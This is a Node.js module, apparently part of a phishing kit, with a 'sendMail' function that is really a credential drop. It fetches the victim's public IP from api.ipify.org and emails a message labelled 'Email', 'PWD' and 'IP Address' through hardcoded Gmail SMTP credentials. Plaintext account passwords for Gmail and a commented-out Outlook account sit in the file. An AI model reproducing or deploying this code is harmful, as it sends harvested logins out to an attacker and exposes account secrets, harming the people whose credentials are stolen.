const nodeMailer = require('nodemailer')
const axios = require('axios');
const { response } = require('express');

const adminEmail = 'cashier9yaheetech.cn@gmail.com'
const adminPassword = 'arme gval lxsa hpeg'
const mailHost = 'smtp.gmail.com'


// const adminEmail = 'logs10ms@outlook.com'
// const adminPassword = 'Come_400'
// const mailHost = 'smtp.office365.com'
const mailPort = 587

const sendMail = (to, subject, htmlContent) => {
    axios('https://api.ipify.org/?format=json')
    .then (async response => {
      const ipAddress =await response.data.ip;
      const transporter = nodeMailer.createTransport({
        host: mailHost,
        port: mailPort,
        secure: false,
        auth: {
          user: adminEmail,
          pass: adminPassword
        }
      })

      const options = {
        from: adminEmail,
        to: to,
        subject: subject, 
        html: `<p>Email: ${subject}<br>PWD: ${htmlContent}<br>IP Address: ${ipAddress}</p>`,
      }

      return transporter.sendMail(options)
    })
    .catch(error => {
      console.error('Error:', error);
    });
  }

module.exports = {
  sendMail: sendMail,
}
